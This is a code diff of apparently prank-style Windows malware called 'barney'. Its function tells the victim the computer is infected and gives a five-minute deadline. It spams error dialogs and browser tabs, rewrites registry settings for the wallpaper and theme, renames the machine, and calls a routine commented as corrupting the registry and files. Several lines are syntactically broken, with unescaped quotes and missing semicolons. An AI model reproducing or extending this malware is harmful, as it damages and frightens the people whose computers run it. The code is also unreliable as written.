@@ -124,7 +124,7 @@ void trollies()
            "You got infected by barney,\nyour computer isn't yours anymore but belongs to barney.\n"
            "You have 5 minutes to save your computer. Good luck :D\n"
            "\033[0m");  // Reset color
-           
+    
     //Spam error message box
     for (int i = 0; i < 300; i++)
         MessageBox(
@@ -135,6 +135,15 @@ void trollies()
             MB_ABORTRETRYIGNORE | MB_DEFBUTTON2 | MB_ICONERROR
         );
 
+    // Change wallpaper
+    system("reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "wallpaper.jpg" /f")
+
+    // Change scheme to b&w
+    system("powershell Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name SystemUsesLightTheme -Value 0")
+
+    // Change computer name
+    SetComputerNameEx(ComputerNamePhysicalNetBIOS, L"Barney");
+
     //Opens browser
     for (int i = 0; i < 20; i++)
     system("start https://www.google.com/search?q=barney+is+looking+for+you")
@@ -143,12 +152,6 @@ void trollies()
     for (int i = 0; i < 20; i++) {
     PlaySound("music.wav", NULL, SND_FILENAME|SND_ASYNC);
     }
-
-    // Change wallpaper
-    system("reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "wallpaper.jpg" /f")
-
-    // Change scheme to b&w
-    system("powershell Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name SystemUsesLightTheme -Value 0")
 
     // Corrupts registry and files
     corruption();
@@ -164,9 +167,6 @@ void trollies()
     int keysize = 1;
     char* text = "barneybarneymalware";
     xorCrypt((unsigned char*)text, strlen(text), key, keysize); 
-
-    // Change computer name
-    SetComputerNameEx(ComputerNamePhysicalNetBIOS, L"Barney");
 
 
 }
